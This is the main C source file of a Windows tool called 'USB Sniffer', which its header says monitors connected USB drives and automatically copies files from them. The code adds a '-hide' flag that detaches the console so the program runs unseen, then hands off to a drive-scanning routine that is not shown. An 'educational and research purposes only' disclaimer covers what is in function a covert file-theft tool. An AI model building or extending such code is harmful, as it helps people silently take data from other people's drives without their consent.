/*

Project: USB Sniffer
Author: fuckin_busy
Contact: https://github.com/fuckin_busy
Date: October 5, 2024

Description: USB Sniffer is an application designed to monitor connected USB drives and automatically copy files from them.
            The tool is intended for educational and research purposes only. It is not created to cause harm, and any misuse
            is the responsibility of the user.

License: GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007
        This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.

Requirements: Win7 or above (actually not sure, but it should work)

Disclaimer: This software should be used in accordance with applicable laws and regulations. The author is not responsible for any
            misuse or illegal activities involving this program.

*/

#include "../include/drive.h"
#include <string.h>

#define FLAG_CMDHIDE "-hide"
#define FLAG_CMDSHOW "-show"

int main(int argc, char *argv[])
{
    HWND console = GetConsoleWindow();

    if (!console)
    {
        printf_s("WARNING: Unable to get console window.\n");
    }

    if (argc > 1)
    {
        if (_stricmp(argv[1], FLAG_CMDHIDE) == 0)
        {
            FreeConsole(); // this winapi function removes the console
        }
        else if (_stricmp(argv[1], FLAG_CMDSHOW) == 0)
        {
            ShowWindow(console, SW_SHOW);
        }
        else
        {
            printf("ERROR: %s flag does not exist.\n", argv[1]);
            return 1;
        }
    }

    printf("----------------------------------------\n");
    printf("|                                      |\n");
    printf("|             USB Sniffer              |\n");
    printf("|                                      |\n");
    printf("----------------------------------------\n\n");
    printf("Searching...\n");

    ScanDrives(SLEEP_TIMEOUT_MS);
    return 0;
}